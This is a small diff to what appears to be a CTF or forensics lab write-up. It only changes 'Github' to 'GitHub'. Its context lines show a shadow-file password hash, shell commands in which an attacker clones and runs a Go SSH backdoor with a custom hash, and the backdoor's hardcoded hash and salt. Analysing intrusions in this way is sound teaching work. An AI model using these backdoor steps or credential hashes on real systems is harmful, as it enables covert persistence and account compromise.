@@ -89,7 +89,7 @@ muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3we
 <br/>
 
 - The Attacker Estabilished Persistence Using: <b style={{ color: 'PowderBlue' }}>[GO SSH Backdoor]</b>
-- <a class="button button--outline button--info" href="https://github.com/NinjaJc01/ssh-backdoor">GO SSH Backdoor Github</a>
+- <a class="button button--outline button--info" href="https://github.com/NinjaJc01/ssh-backdoor">GO SSH Backdoor GitHub</a>
 
 ```bash
 james@overpass-production:~$ git clone https://github.com/NinjaJc01/ssh-backdoor
@@ -155,7 +155,7 @@ muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3we
 ## Code Analysis
 
 
-- `Github` Backdoor Analysis.
+- `GitHub` Backdoor Analysis.
 - The Attacked Used this **HASH** to Establish a Persistence.
 
 ```bash
@@ -163,14 +163,14 @@ james@overpass-production:~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02
 ```
 
 ```go
-// Default HASH >> (Source from Github Repository)
+// Default HASH >> (Source from GitHub Repository)
 "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"
 
 // Attacker HASH
 // highlight-next-line
 "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed"
 
-// Hardcoded SALT >> (Source from Github Repository)
+// Hardcoded SALT >> (Source from GitHub Repository)
 func passwordHandler(_ ssh.Context, password string) bool {
 	// highlight-next-line
 	return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
